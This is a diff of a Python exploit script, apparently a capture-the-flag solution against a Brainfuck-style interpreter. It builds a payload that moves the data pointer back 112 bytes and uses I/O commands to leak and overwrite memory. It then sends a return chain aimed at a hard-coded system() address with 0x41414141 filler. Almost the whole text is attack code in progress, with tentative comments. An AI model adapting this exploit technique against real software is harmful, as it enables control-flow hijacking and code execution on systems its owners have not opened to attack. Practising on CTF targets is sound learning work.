@@ -45,11 +45,13 @@ with open("payload", "w") as f:
 #payload = ",.,.<\nAB\n".encode() # --> should work
 # 1st part - before the input - just the commands
 payload = ""
-payload += "<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
+#payload += "<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
+payload += "<" * 112 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += ",>,>,>," # putchar - for sending the last char
-payload += ".CCaC"*100 # call to puts()
-payload += "[" # call to puts()
-payload += "[[[[[" # call to puts()
+payload += "." # call to putchar()
+payload += "BBBBBBBB" # call to putchar()
+#payload += ".CCaC"*100 # call to puts()
+#payload += "[" # call to puts()
 payload +="\n"
 conn.send(payload)
 # 2nd part - the input to write ( the function to jump to ) 
@@ -63,7 +65,10 @@ pop_eax_address = my_rop
 #payload = p32(pop_eax_address) # pop eax  - I might need to call it like 0x128
 #payload = bytes(my_rop)
 payload = p32(0xf7e55db0) # system()
-payload += my_rop # pop eax  - I might need to call it like 0x128
+payload += p32(0x41414141) # system()
+payload += p32(0x41414141) # system()
+payload += p32(0x41414141) # system()
+#payload += my_rop # pop eax  - I might need to call it like 0x128
 payload +=b"\n"
 conn.send(payload)
 with open("payload", "ab+") as f:
